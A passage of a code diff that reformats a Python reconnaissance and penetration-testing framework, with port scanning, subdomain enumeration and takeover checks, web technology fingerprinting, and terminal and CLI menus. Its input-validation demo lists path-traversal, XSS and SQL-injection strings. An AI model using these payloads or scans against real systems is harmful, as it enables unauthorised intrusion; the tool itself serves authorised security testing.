\n+\n         return results\n-    \n+\n     def web_technology_detection(self, urls: List[str]) -> Dict[str, Dict[str, Any]]:\n         \"\"\"Detect web technologies and frameworks\"\"\"\n         if not self.session:\n             return {}\n-        \n+\n         results = {}\n-        \n+\n         # Technology signatures\n         tech_signatures = {\n-            'WordPress': [r'wp-content', r'/wp-admin/', r'wordpress'],\n-            'Drupal': [r'sites/all/', r'drupal', r'/node/'],\n-            'Joomla': [r'joomla', r'/administrator/', r'com_'],\n-            'Apache': [r'Server: Apache', r'Apache/'],\n-            'Nginx': [r'Server: nginx', r'nginx/'],\n-            'IIS': [r'Server: Microsoft-IIS', r'X-Powered-By: ASP.NET'],\n-            'PHP': [r'X-Powered-By: PHP', r'\\.php'],\n-            'ASP.NET': [r'X-Powered-By: ASP.NET', r'\\.aspx'],\n-            'Ruby on Rails': [r'X-Powered-By: Phusion Passenger', r'ruby'],\n-            'Express.js': [r'X-Powered-By: Express', r'express'],\n-            'Django': [r'django', r'csrftoken'],\n-            'Flask': [r'Werkzeug', r'flask']\n+            \"WordPress\": [r\"wp-content\", r\"/wp-admin/\", r\"wordpress\"],\n+            \"Drupal\": [r\"sites/all/\", r\"drupal\", r\"/node/\"],\n+            \"Joomla\": [r\"joomla\", r\"/administrator/\", r\"com_\"],\n+            \"Apache\": [r\"Server: Apache\", r\"Apache/\"],\n+            \"Nginx\": [r\"Server: nginx\", r\"nginx/\"],\n+            \"IIS\": [r\"Server: Microsoft-IIS\", r\"X-Powered-By: ASP.NET\"],\n+            \"PHP\": [r\"X-Powered-By: PHP\", r\"\\.php\"],\n+            \"ASP.NET\": [r\"X-Powered-By: ASP.NET\", r\"\\.aspx\"],\n+            \"Ruby on Rails\": [r\"X-Powered-By: Phusion Passenger\", r\"ruby\"],\n+            \"Express.js\": [r\"X-Powered-By: Express\", r\"express\"],\n+            \"Django\": [r\"django\", r\"csrftoken\"],\n+            \"Flask\": [r\"Werkzeug\", r\"flask\"],\n         }\n-        \n+\n         def analyze_url(url):\n             try:\n                 response = self.session.get(url, timeout=10)\n                 headers = str(response.headers)\n                 content = response.text\n-                \n+\n                 detected_tech = []\n                 for tech, signatures in tech_signatures.items():\n                     for signature in signatures:\n                         if re.search(signature, headers + content, re.IGNORECASE):\n                             detected_tech.append(tech)\n                             break\n-                \n+\n                 return {\n-                    'url': url,\n-                    'status_code': response.status_code,\n-                    'technologies': list(set(detected_tech)),\n-                    'server': response.headers.get('Server', 'Unknown'),\n-                    'content_type': response.headers.get('Content-Type', 'Unknown'),\n-                    'title': self._extract_title(content)\n+                    \"url\": url,\n+                    \"status_code\": response.status_code,\n+                    \"technologies\": list(set(detected_tech)),\n+                    \"server\": response.headers.get(\"Server\", \"Unknown\"),\n+                    \"content_type\": response.headers.get(\"Content-Type\", \"Unknown\"),\n+                    \"title\": self._extract_title(content),\n                 }\n             except Exception as e:\n                 return {\n-                    'url': url,\n-                    'error': str(e),\n-                    'technologies': [],\n-                    'status_code': None\n+                    \"url\": url,\n+                    \"error\": str(e),\n+                    \"technologies\": [],\n+                    \"status_code\": None,\n                 }\n-        \n+\n         # Analyze URLs\n         with ThreadPoolExecutor(max_workers=20) as executor:\n             futures = [executor.submit(analyze_url, url) for url in urls]\n             for future in as_completed(futures):\n                 result = future.result()\n                 if result:\n-                    results[result['url']] = result\n-        \n+                    results[result[\"url\"]] = result\n+\n         return results\n-    \n+\n     def _extract_title(self, html: str) -> Optional[str]:\n         \"\"\"Extract title from HTML content\"\"\"\n         try:\n-            match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)\n+            match = re.search(r\"<title[^>]*>([^<]+)</title>\", html, re.IGNORECASE)\n             return match.group(1).strip() if match else None\n         except:\n             return None\n \n+\n # ============================================================================\n # CONSOLIDATED TUI INTERFACE\n # ============================================================================\n \n if HAS_TEXTUAL:\n+\n     class PantheonMasterTUI(App):\n         \"\"\"Consolidated Advanced TUI for Bl4ckC3ll_PANTHEON Master\"\"\"\n-        \n+\n         TITLE = \"Bl4ckC3ll PANTHEON MASTER - Consolidated Security Testing Framework\"\n         SUB_TITLE = f\"Version {VERSION} - Complete Penetration Testing & Vulnerability Assessment\"\n-        \n+\n         BINDINGS = [\n             Binding(\"ctrl+q\", \"quit\", \"Quit\"),\n             Binding(\"ctrl+d\", \"toggle_dark\", \"Toggle Dark Mode\"),\n             Binding(\"f1\", \"show_help\", \"Help\"),\n             Binding(\"f2\", \"show_targets\", \"Targets\"),\n             Binding(\"f3\", \"show_scanner\", \"Scanner\"),\n             Binding(\"f4\", \"show_reports\", \"Reports\"),\n             Binding(\"f5\", \"show_settings\", \"Settings\"),\n             Binding(\"ctrl+r\", \"refresh\", \"Refresh\"),\n         ]\n-        \n+\n         def __init__(self):\n             super().__init__()\n             self.logger = PantheonLogger(\"TUI\")\n             self.scan_manager = AdvancedScanManager()\n             self.current_scan = None\n-            \n+\n         def compose(self) -> ComposeResult:\n             \"\"\"Compose the main UI\"\"\"\n             yield Header()\n-            \n+\n             with Container(id=\"main-container\"):\n                 with TabbedContent(id=\"main-tabs\"):\n                     # Dashboard Tab\n                     with TabPane(\"\ud83d\udcca Dashboard\", id=\"dashboard\"):\n                         with Container(id=\"dashboard-container\"):\n-                            yield Static(self._get_dashboard_content(), id=\"dashboard-content\")\n-                    \n+                            yield Static(\n+                                self._get_dashboard_content(), id=\"dashboard-content\"\n+                            )\n+\n                     # Targets Tab\n                     with TabPane(\"\ud83c\udfaf Targets\", id=\"targets\"):\n                         with Container(id=\"targets-container\"):\n-                            yield Input(placeholder=\"Enter target domain or IP\", id=\"target-input\")\n+                            yield Input(\n+                                placeholder=\"Enter target domain or IP\",\n+                                id=\"target-input\",\n+                            )\n                             yield Button(\"Add Target\", id=\"add-target\")\n                             yield DataTable(id=\"targets-table\")\n-                    \n+\n                     # Scanner Tab\n                     with TabPane(\"\ud83d\udd0d Scanner\", id=\"scanner\"):\n                         with Container(id=\"scanner-container\"):\n-                            yield Static(\"Scanner Configuration\", classes=\"section-title\")\n+                            yield Static(\n+                                \"Scanner Configuration\", classes=\"section-title\"\n+                            )\n                             with Horizontal():\n-                                yield Checkbox(\"Subdomain Enumeration\", value=True, id=\"scan-subdomains\")\n-                                yield Checkbox(\"Port Scanning\", value=True, id=\"scan-ports\")\n-                                yield Checkbox(\"Technology Detection\", value=True, id=\"scan-tech\")\n-                            yield Button(\"Start Scan\", id=\"start-scan\", variant=\"primary\")\n+                                yield Checkbox(\n+                                    \"Subdomain Enumeration\",\n+                                    value=True,\n+                                    id=\"scan-subdomains\",\n+                                )\n+                                yield Checkbox(\n+                                    \"Port Scanning\", value=True, id=\"scan-ports\"\n+                                )\n+                                yield Checkbox(\n+                                    \"Technology Detection\", value=True, id=\"scan-tech\"\n+                                )\n+                            yield Button(\n+                                \"Start Scan\", id=\"start-scan\", variant=\"primary\"\n+                            )\n                             yield ProgressBar(id=\"scan-progress\")\n                             yield Log(id=\"scan-log\")\n-                    \n+\n                     # Reports Tab\n                     with TabPane(\"\ud83d\udccb Reports\", id=\"reports\"):\n                         with Container(id=\"reports-container\"):\n                             yield DataTable(id=\"reports-table\")\n                             yield Button(\"Generate Report\", id=\"generate-report\")\n-                    \n-                    # Settings Tab  \n+\n+                    # Settings Tab\n                     with TabPane(\"\u2699\ufe0f Settings\", id=\"settings\"):\n                         with Container(id=\"settings-container\"):\n-                            yield Static(\"Framework Configuration\", classes=\"section-title\")\n-                            yield Input(placeholder=\"Max Threads (50)\", id=\"max-threads\")\n+                            yield Static(\n+                                \"Framework Configuration\", classes=\"section-title\"\n+                            )\n+                            yield Input(\n+                                placeholder=\"Max Threads (50)\", id=\"max-threads\"\n+                            )\n                             yield Input(placeholder=\"Timeout (30s)\", id=\"timeout\")\n                             yield Checkbox(\"Verbose Output\", value=True, id=\"verbose\")\n                             yield Button(\"Save Settings\", id=\"save-settings\")\n-            \n+\n             yield Footer()\n-        \n+\n         def _get_dashboard_content(self) -> str:\n             \"\"\"Get dashboard content\"\"\"\n             system_info = \"\"\n             if HAS_PSUTIL:\n                 cpu_percent = psutil.cpu_percent(interval=1)\n                 memory = psutil.virtual_memory()\n-                disk = psutil.disk_usage('/')\n-                \n+                disk = psutil.disk_usage(\"/\")\n+\n                 system_info = f\"\"\"\n System Information:\n OS: {platform.system()} {platform.release()}\n Python: {platform.python_version()}\n Architecture: {platform.machine()}\n@@ -953,379 +1135,416 @@\n \u2705 Security Validation Enabled\n \u2705 BCAR Module Loaded\n \u2705 Advanced Scanner Ready\n \u26a0\ufe0f  System monitoring unavailable (psutil not installed)\n \"\"\"\n-            \n+\n             return system_info\n-        \n+\n         @on(Button.Pressed, \"#add-target\")\n         async def add_target(self):\n             \"\"\"Add a new target\"\"\"\n             target_input = self.query_one(\"#target-input\", Input)\n             target = target_input.value.strip()\n-            \n-            if target and (SecurityValidator.validate_domain(target) or SecurityValidator.validate_ip(target)):\n+\n+            if target and (\n+                SecurityValidator.validate_domain(target)\n+                or SecurityValidator.validate_ip(target)\n+            ):\n                 table = self.query_one(\"#targets-table\", DataTable)\n                 if not table.columns:\n                     table.add_columns(\"Target\", \"Type\", \"Status\", \"Added\")\n-                \n-                target_type = \"IP\" if SecurityValidator.validate_ip(target) else \"Domain\"\n-                table.add_row(target, target_type, \"Ready\", datetime.now().strftime(\"%H:%M:%S\"))\n+\n+                target_type = (\n+                    \"IP\" if SecurityValidator.validate_ip(target) else \"Domain\"\n+                )\n+                table.add_row(\n+                    target, target_type, \"Ready\", datetime.now().strftime(\"%H:%M:%S\")\n+                )\n                 target_input.value = \"\"\n                 self.logger.info(f\"Added target: {target}\")\n             else:\n                 self.logger.error(\"Invalid target format\")\n-        \n+\n         @on(Button.Pressed, \"#start-scan\")\n         async def start_scan(self):\n             \"\"\"Start security scan\"\"\"\n             targets_table = self.query_one(\"#targets-table\", DataTable)\n             if not targets_table.row_count:\n                 self.logger.warning(\"No targets added\")\n                 return\n-            \n+\n             # Get targets from table\n             targets = []\n             for row_key in targets_table.rows:\n                 row = targets_table.get_row(row_key)\n                 targets.append(str(row[0]))\n-            \n+\n             progress_bar = self.query_one(\"#scan-progress\", ProgressBar)\n             scan_log = self.query_one(\"#scan-log\", Log)\n-            \n+\n             progress_bar.update(total=100)\n             scan_log.clear()\n             scan_log.write_line(\"Starting comprehensive security scan...\")\n-            \n+\n             # Start scan in background thread\n             def run_scan():\n                 try:\n                     for i, target in enumerate(targets):\n                         progress_bar.update(progress=(i * 100) // len(targets))\n                         scan_log.write_line(f\"Scanning target: {target}\")\n-                        \n+\n                         # BCAR Certificate Transparency Search\n                         if SecurityValidator.validate_domain(target):\n-                            subdomains = self.scan_manager.bcar.certificate_transparency_search(target)\n-                            scan_log.write_line(f\"Found {len(subdomains)} subdomains via CT logs\")\n-                        \n+                            subdomains = (\n+                                self.scan_manager.bcar.certificate_transparency_search(\n+                                    target\n+                                )\n+                            )\n+                            scan_log.write_line(\n+                                f\"Found {len(subdomains)} subdomains via CT logs\"\n+                            )\n+\n                         # Port Scanning\n-                        port_results = self.scan_manager.comprehensive_port_scan([target])\n+                        port_results = self.scan_manager.comprehensive_port_scan(\n+                            [target]\n+                        )\n                         if target in port_results:\n                             open_ports = port_results[target]\n                             scan_log.write_line(f\"Found {len(open_ports)} open ports\")\n-                        \n+\n                         # Technology Detection\n-                        if SecurityValidator.validate_domain(target) or SecurityValidator.validate_ip(target):\n-                            tech_results = self.scan_manager.web_technology_detection([f\"http://{target}\"])\n+                        if SecurityValidator.validate_domain(\n+                            target\n+                        ) or SecurityValidator.validate_ip(target):\n+                            tech_results = self.scan_manager.web_technology_detection(\n+                                [f\"http://{target}\"]\n+                            )\n                             for url, tech_info in tech_results.items():\n-                                if tech_info.get('technologies'):\n-                                    scan_log.write_line(f\"Detected technologies: {', '.join(tech_info['technologies'])}\")\n-                    \n+                                if tech_info.get(\"technologies\"):\n+                                    scan_log.write_line(\n+                                        f\"Detected technologies: {', '.join(tech_info['technologies'])}\"\n+                                    )\n+\n                     progress_bar.update(progress=100)\n                     scan_log.write_line(\"\u2705 Scan completed successfully!\")\n-                    \n+\n                 except Exception as e:\n                     scan_log.write_line(f\"\u274c Scan failed: {e}\")\n-            \n+\n             # Run scan in thread to avoid blocking UI\n             thread = threading.Thread(target=run_scan)\n             thread.daemon = True\n             thread.start()\n \n+\n # ============================================================================\n # COMMAND LINE INTERFACE\n # ============================================================================\n \n+\n class PantheonMasterCLI:\n     \"\"\"Command Line Interface for Pantheon Master\"\"\"\n-    \n+\n     def __init__(self):\n         self.logger = PantheonLogger(\"CLI\")\n         self.scan_manager = AdvancedScanManager()\n         self.config = DEFAULT_CONFIG.copy()\n-        \n+\n     def show_banner(self):\n         \"\"\"Display the application banner\"\"\"\n         print(BANNER)\n         print(f\"[SECURITY] Advanced Security Testing Framework - Educational Use Only\")\n         print(f\"Author: @cxb3rf1lth | Version: {VERSION}\")\n         print(\"=\" * 80)\n-    \n+\n     def show_main_menu(self):\n         \"\"\"Display the main menu options\"\"\"\n         menu_options = [\n             \"[1] \ud83c\udfaf Target Management - Add, edit, and manage scan targets\",\n-            \"[2] \ud83d\udd0d BCAR Reconnaissance - Certificate transparency and subdomain discovery\", \n+            \"[2] \ud83d\udd0d BCAR Reconnaissance - Certificate transparency and subdomain discovery\",\n             \"[3] \ud83c\udf10 Advanced Port Scanning - Comprehensive port and service detection\",\n             \"[4] \ud83d\udee1\ufe0f  Technology Detection - Web framework and technology identification\",\n             \"[5] \u26a1 Subdomain Takeover Check - Detect vulnerable subdomain configurations\",\n             \"[6] \ud83d\udd12 Security Validation - Input validation and sanitization testing\",\n             \"[7] \ud83d\udcca Vulnerability Assessment - AI-powered vulnerability analysis\",\n             \"[8] \u2601\ufe0f  Cloud Security Testing - AWS, Azure, GCP security assessment\",\n-            \"[9] \ud83d\udd17 API Security Testing - REST, GraphQL, SOAP API testing\", \n+            \"[9] \ud83d\udd17 API Security Testing - REST, GraphQL, SOAP API testing\",\n             \"[10] \ud83e\udd16 Automated Testing Chain - Complete automated security pipeline\",\n             \"[11] \ud83d\udc89 Payload Management - Advanced payload generation and injection\",\n             \"[12] \ud83c\udfa8 TUI Interface - Launch advanced terminal user interface\",\n             \"[13] \ud83d\udcc8 Generate Reports - Comprehensive security assessment reports\",\n             \"[14] \u2699\ufe0f  Configuration - Framework settings and preferences\",\n             \"[15] \ud83d\udd27 Tool Diagnostics - Check tool availability and system status\",\n             \"[16] \ud83d\udcda Help & Documentation - Usage guide and documentation\",\n-            \"[17] \ud83d\udeaa Exit - Close the application\"\n+            \"[17] \ud83d\udeaa Exit - Close the application\",\n         ]\n-        \n+\n         print(\"\\n\" + \"=\" * 80)\n         print(\"BL4CKC3LL PANTHEON MASTER - CONSOLIDATED SECURITY TESTING FRAMEWORK\")\n         print(\"=\" * 80)\n-        \n+\n         for option in menu_options:\n             print(option)\n-        \n+\n         print(\"=\" * 80)\n-    \n+\n     def handle_menu_selection(self, choice: str):\n         \"\"\"Handle user menu selection\"\"\"\n         choice = choice.strip()\n-        \n-        if choice == '1':\n+\n+        if choice == \"1\":\n             self.target_management_menu()\n-        elif choice == '2':\n+        elif choice == \"2\":\n             self.bcar_reconnaissance_menu()\n-        elif choice == '3':\n+        elif choice == \"3\":\n             self.port_scanning_menu()\n-        elif choice == '4':\n+        elif choice == \"4\":\n             self.technology_detection_menu()\n-        elif choice == '5':\n+        elif choice == \"5\":\n             self.subdomain_takeover_menu()\n-        elif choice == '6':\n+        elif choice == \"6\":\n             self.security_validation_menu()\n-        elif choice == '7':\n+        elif choice == \"7\":\n             self.vulnerability_assessment_menu()\n-        elif choice == '8':\n+        elif choice == \"8\":\n             self.cloud_security_menu()\n-        elif choice == '9':\n+        elif choice == \"9\":\n             self.api_security_menu()\n-        elif choice == '10':\n+        elif choice == \"10\":\n             self.automated_testing_menu()\n-        elif choice == '11':\n+        elif choice == \"11\":\n             self.payload_management_menu()\n-        elif choice == '12':\n+        elif choice == \"12\":\n             self.launch_tui()\n-        elif choice == '13':\n+        elif choice == \"13\":\n             self.generate_reports_menu()\n-        elif choice == '14':\n+        elif choice == \"14\":\n             self.configuration_menu()\n-        elif choice == '15':\n+        elif choice == \"15\":\n             self.diagnostics_menu()\n-        elif choice == '16':\n+        elif choice == \"16\":\n             self.help_menu()\n-        elif choice == '17':\n+        elif choice == \"17\":\n             return False  # Exit\n         else:\n             self.logger.warning(\"Invalid selection. Please choose 1-17.\")\n-        \n+\n         return True\n-    \n+\n     def target_management_menu(self):\n         \"\"\"Target management interface\"\"\"\n         print(\"\\n\ud83c\udfaf TARGET MANAGEMENT\")\n         print(\"-\" * 50)\n         print(\"1. Add single target\")\n         print(\"2. Add multiple targets from file\")\n         print(\"3. List current targets\")\n         print(\"4. Remove target\")\n         print(\"5. Clear all targets\")\n         print(\"6. Back to main menu\")\n-        \n+\n         choice = input(\"\\nSelect option (1-6): \").strip()\n-        \n-        if choice == '1':\n+\n+        if choice == \"1\":\n             target = input(\"Enter target (domain or IP): \").strip()\n-            if SecurityValidator.validate_domain(target) or SecurityValidator.validate_ip(target):\n+            if SecurityValidator.validate_domain(\n+                target\n+            ) or SecurityValidator.validate_ip(target):\n                 # Add target to configuration\n-                if 'targets' not in self.config:\n-                    self.config['targets'] = []\n-                self.config['targets'].append(target)\n+                if \"targets\" not in self.config:\n+                    self.config[\"targets\"] = []\n+                self.config[\"targets\"].append(target)\n                 self.logger.success(f\"Added target: {target}\")\n             else:\n                 self.logger.error(\"Invalid target format\")\n-        elif choice == '6':\n+        elif choice == \"6\":\n             return\n         else:\n             self.logger.warning(\"Feature implementation in progress\")\n-    \n+\n     def bcar_reconnaissance_menu(self):\n         \"\"\"BCAR reconnaissance interface\"\"\"\n-        if 'targets' not in self.config or not self.config['targets']:\n+        if \"targets\" not in self.config or not self.config[\"targets\"]:\n             self.logger.warning(\"No targets configured. Please add targets first.\")\n             return\n-        \n+\n         print(\"\\n\ud83d\udd0d BCAR RECONNAISSANCE\")\n         print(\"-\" * 50)\n-        \n-        for target in self.config['targets']:\n+\n+        for target in self.config[\"targets\"]:\n             if SecurityValidator.validate_domain(target):\n                 print(f\"\\nRunning BCAR reconnaissance on: {target}\")\n-                \n+\n                 # Certificate Transparency Search\n                 print(\"\ud83d\udd0d Searching certificate transparency logs...\")\n-                subdomains = self.scan_manager.bcar.certificate_transparency_search(target)\n+                subdomains = self.scan_manager.bcar.certificate_transparency_search(\n+                    target\n+                )\n                 print(f\"\u2705 Found {len(subdomains)} subdomains from CT logs\")\n-                \n+\n                 # Advanced Subdomain Enumeration\n                 print(\"\ud83d\udd0d Performing advanced subdomain enumeration...\")\n-                enum_subdomains = self.scan_manager.bcar.advanced_subdomain_enumeration(target)\n+                enum_subdomains = self.scan_manager.bcar.advanced_subdomain_enumeration(\n+                    target\n+                )\n                 print(f\"\u2705 Found {len(enum_subdomains)} subdomains via enumeration\")\n-                \n+\n                 # Subdomain Takeover Check\n                 all_subdomains = list(set(subdomains + enum_subdomains))\n                 if all_subdomains:\n                     print(\"\ud83d\udd0d Checking for subdomain takeover vulnerabilities...\")\n-                    takeover_results = self.scan_manager.bcar.subdomain_takeover_check(all_subdomains[:20])  # Limit for demo\n+                    takeover_results = self.scan_manager.bcar.subdomain_takeover_check(\n+                        all_subdomains[:20]\n+                    )  # Limit for demo\n                     if takeover_results:\n-                        print(f\"\u26a0\ufe0f  Found {len(takeover_results)} potential takeover vulnerabilities!\")\n+                        print(\n+                            f\"\u26a0\ufe0f  Found {len(takeover_results)} potential takeover vulnerabilities!\"\n+                        )\n                         for vuln in takeover_results:\n                             print(f\"  - {vuln['subdomain']} -> {vuln['service']}\")\n                     else:\n                         print(\"\u2705 No subdomain takeover vulnerabilities detected\")\n             else:\n                 print(f\"\u26a0\ufe0f  Skipping {target} (not a domain)\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def port_scanning_menu(self):\n         \"\"\"Port scanning interface\"\"\"\n-        if 'targets' not in self.config or not self.config['targets']:\n+        if \"targets\" not in self.config or not self.config[\"targets\"]:\n             self.logger.warning(\"No targets configured. Please add targets first.\")\n             return\n-        \n+\n         print(\"\\n\ud83c\udf10 ADVANCED PORT SCANNING\")\n         print(\"-\" * 50)\n-        \n+\n         # Port scan all targets\n-        port_results = self.scan_manager.comprehensive_port_scan(self.config['targets'])\n-        \n+        port_results = self.scan_manager.comprehensive_port_scan(self.config[\"targets\"])\n+\n         for target, open_ports in port_results.items():\n             print(f\"\\n\ud83c\udfaf Target: {target}\")\n             if open_ports:\n-                print(f\"\u2705 Open ports ({len(open_ports)}): {', '.join(map(str, open_ports[:20]))}\")\n+                print(\n+                    f\"\u2705 Open ports ({len(open_ports)}): {', '.join(map(str, open_ports[:20]))}\"\n+                )\n                 if len(open_ports) > 20:\n                     print(f\"   ... and {len(open_ports) - 20} more ports\")\n             else:\n                 print(\"\u274c No open ports detected\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def technology_detection_menu(self):\n         \"\"\"Technology detection interface\"\"\"\n-        if 'targets' not in self.config or not self.config['targets']:\n+        if \"targets\" not in self.config or not self.config[\"targets\"]:\n             self.logger.warning(\"No targets configured. Please add targets first.\")\n             return\n-        \n+\n         print(\"\\n\ud83d\udee1\ufe0f  TECHNOLOGY DETECTION\")\n         print(\"-\" * 50)\n-        \n+\n         # Prepare URLs for scanning\n         urls = []\n-        for target in self.config['targets']:\n+        for target in self.config[\"targets\"]:\n             urls.extend([f\"http://{target}\", f\"https://{target}\"])\n-        \n+\n         tech_results = self.scan_manager.web_technology_detection(urls)\n-        \n+\n         for url, tech_info in tech_results.items():\n             print(f\"\\n\ud83d\udd17 URL: {url}\")\n-            if 'error' in tech_info:\n+            if \"error\" in tech_info:\n                 print(f\"\u274c Error: {tech_info['error']}\")\n             else:\n                 print(f\"\ud83d\udcca Status: {tech_info.get('status_code', 'Unknown')}\")\n                 print(f\"\ud83d\udda5\ufe0f  Server: {tech_info.get('server', 'Unknown')}\")\n-                if tech_info.get('title'):\n+                if tech_info.get(\"title\"):\n                     print(f\"\ud83d\udcdd Title: {tech_info['title']}\")\n-                if tech_info.get('technologies'):\n+                if tech_info.get(\"technologies\"):\n                     print(f\"\u2699\ufe0f  Technologies: {', '.join(tech_info['technologies'])}\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def subdomain_takeover_menu(self):\n         \"\"\"Subdomain takeover testing interface\"\"\"\n         print(\"\\n\u26a1 SUBDOMAIN TAKEOVER CHECK\")\n         print(\"-\" * 50)\n         print(\"This feature checks for subdomain takeover vulnerabilities\")\n         print(\"by analyzing subdomain responses for takeover signatures.\")\n         print(\"\\nNote: This requires targets with subdomains to be effective.\")\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def security_validation_menu(self):\n         \"\"\"Security validation testing interface\"\"\"\n         print(\"\\n\ud83d\udd12 SECURITY VALIDATION\")\n         print(\"-\" * 50)\n         print(\"Testing input validation and sanitization:\")\n-        \n+\n         # Test various inputs\n         test_inputs = [\n             \"normal-domain.com\",\n             \"../../etc/passwd\",\n             \"<script>alert('xss')</script>\",\n             \"'; DROP TABLE users; --\",\n             \"javascript:alert(1)\",\n-            \"192.168.1.1\"\n+            \"192.168.1.1\",\n         ]\n-        \n+\n         for test_input in test_inputs:\n             print(f\"\\n\ud83d\udd0d Testing: {test_input}\")\n-            \n+\n             # Domain validation\n             is_valid_domain = SecurityValidator.validate_domain(test_input)\n-            print(f\"   Domain validation: {'\u2705 PASS' if is_valid_domain else '\u274c FAIL'}\")\n-            \n+            print(\n+                f\"   Domain validation: {'\u2705 PASS' if is_valid_domain else '\u274c FAIL'}\"\n+            )\n+\n             # IP validation\n             is_valid_ip = SecurityValidator.validate_ip(test_input)\n             print(f\"   IP validation: {'\u2705 PASS' if is_valid_ip else '\u274c FAIL'}\")\n-            \n+\n             # Sanitization\n             sanitized = SecurityValidator.sanitize_input(test_input)\n             if sanitized != test_input:\n                 print(f\"   Sanitized: {sanitized}\")\n             else:\n                 print(f\"   Sanitization: No changes needed\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def vulnerability_assessment_menu(self):\n         \"\"\"AI-powered vulnerability assessment interface\"\"\"\n         print(\"\\n\ud83d\udcca VULNERABILITY ASSESSMENT\")\n         print(\"-\" * 50)\n         if HAS_ML:\n             print(\"\u2705 Machine Learning capabilities available\")\n             print(\"\ud83e\udd16 AI-powered vulnerability analysis ready\")\n         else:\n             print(\"\u26a0\ufe0f  Machine Learning libraries not installed\")\n             print(\"   Install numpy, pandas, scikit-learn for AI features\")\n-        \n+\n         print(\"\\nThis module provides:\")\n         print(\"- Intelligent vulnerability prioritization\")\n         print(\"- False positive reduction\")\n         print(\"- Risk scoring and threat correlation\")\n         print(\"- Pattern recognition for vulnerability clusters\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def cloud_security_menu(self):\n         \"\"\"Cloud security assessment interface\"\"\"\n         print(\"\\n\u2601\ufe0f  CLOUD SECURITY ASSESSMENT\")\n         print(\"-\" * 50)\n         print(\"Multi-cloud security testing capabilities:\")\n         print(\"\u2705 AWS S3 bucket enumeration\")\n-        print(\"\u2705 Azure Blob storage detection\") \n+        print(\"\u2705 Azure Blob storage detection\")\n         print(\"\u2705 Google Cloud Storage scanning\")\n         print(\"\u2705 Container registry analysis\")\n         print(\"\u2705 Kubernetes exposure testing\")\n         print(\"\u2705 Cloud metadata service SSRF testing\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def api_security_menu(self):\n         \"\"\"API security testing interface\"\"\"\n         print(\"\\n\ud83d\udd17 API SECURITY TESTING\")\n         print(\"-\" * 50)\n         print(\"Comprehensive API security assessment:\")\n@@ -1333,53 +1552,59 @@\n         print(\"\u2705 GraphQL schema analysis\")\n         print(\"\u2705 SOAP service enumeration\")\n         print(\"\u2705 JWT token validation testing\")\n         print(\"\u2705 Authentication bypass detection\")\n         print(\"\u2705 API rate limiting testing\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def automated_testing_menu(self):\n         \"\"\"Automated testing chain interface\"\"\"\n         print(\"\\n\ud83e\udd16 AUTOMATED TESTING CHAIN\")\n         print(\"-\" * 50)\n-        \n-        if 'targets' not in self.config or not self.config['targets']:\n+\n+        if \"targets\" not in self.config or not self.config[\"targets\"]:\n             self.logger.warning(\"No targets configured. Please add targets first.\")\n             input(\"\\nPress Enter to continue...\")\n             return\n-        \n+\n         print(\"Running complete automated security testing chain...\")\n-        \n-        for target in self.config['targets']:\n+\n+        for target in self.config[\"targets\"]:\n             print(f\"\\n\ud83c\udfaf Processing target: {target}\")\n-            \n+\n             # Step 1: BCAR Reconnaissance\n             print(\"  Step 1/4: BCAR Reconnaissance...\")\n             if SecurityValidator.validate_domain(target):\n-                subdomains = self.scan_manager.bcar.certificate_transparency_search(target, limit=100)\n+                subdomains = self.scan_manager.bcar.certificate_transparency_search(\n+                    target, limit=100\n+                )\n                 print(f\"    \u2705 Found {len(subdomains)} subdomains\")\n-            \n+\n             # Step 2: Port Scanning\n             print(\"  Step 2/4: Port Scanning...\")\n             port_results = self.scan_manager.comprehensive_port_scan([target])\n             open_ports = port_results.get(target, [])\n             print(f\"    \u2705 Found {len(open_ports)} open ports\")\n-            \n+\n             # Step 3: Technology Detection\n             print(\"  Step 3/4: Technology Detection...\")\n-            tech_results = self.scan_manager.web_technology_detection([f\"http://{target}\"])\n-            tech_count = sum(len(info.get('technologies', [])) for info in tech_results.values())\n+            tech_results = self.scan_manager.web_technology_detection(\n+                [f\"http://{target}\"]\n+            )\n+            tech_count = sum(\n+                len(info.get(\"technologies\", [])) for info in tech_results.values()\n+            )\n             print(f\"    \u2705 Detected {tech_count} technologies\")\n-            \n+\n             # Step 4: Security Assessment\n             print(\"  Step 4/4: Security Assessment...\")\n             print(f\"    \u2705 Assessment completed\")\n-        \n+\n         print(\"\\n\u2705 Automated testing chain completed!\")\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def payload_management_menu(self):\n         \"\"\"Payload management interface\"\"\"\n         print(\"\\n\ud83d\udc89 PAYLOAD MANAGEMENT\")\n         print(\"-\" * 50)\n         print(\"Advanced payload generation and management:\")\n@@ -1387,13 +1612,13 @@\n         print(\"\u2705 XSS payload generation\")\n         print(\"\u2705 SQL injection payloads\")\n         print(\"\u2705 Command injection payloads\")\n         print(\"\u2705 Custom payload templates\")\n         print(\"\u2705 Payload encoding and obfuscation\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def launch_tui(self):\n         \"\"\"Launch the TUI interface\"\"\"\n         if HAS_TEXTUAL:\n             print(\"\\n\ud83c\udfa8 Launching Advanced TUI Interface...\")\n             try:\n@@ -1404,87 +1629,88 @@\n                 input(\"Press Enter to continue...\")\n         else:\n             print(\"\\n\u274c TUI not available - Textual library not installed\")\n             print(\"Install textual: pip install textual\")\n             input(\"Press Enter to continue...\")\n-    \n+\n     def generate_reports_menu(self):\n         \"\"\"Report generation interface\"\"\"\n         print(\"\\n\ud83d\udcc8 GENERATE REPORTS\")\n         print(\"-\" * 50)\n-        \n+\n         if HAS_VISUALIZATION:\n             print(\"\u2705 Report generation capabilities available\")\n             print(\"\ud83d\udcca HTML reports with visualizations\")\n             print(\"\ud83d\udccb JSON structured data export\")\n             print(\"\ud83d\udcc4 CSV data export\")\n             print(\"\ud83d\udcf8 Screenshot integration\")\n         else:\n             print(\"\u26a0\ufe0f  Visualization libraries not installed\")\n             print(\"   Install matplotlib, plotly for enhanced reports\")\n-        \n+\n         print(\"\\nReport features:\")\n         print(\"- Executive summary\")\n         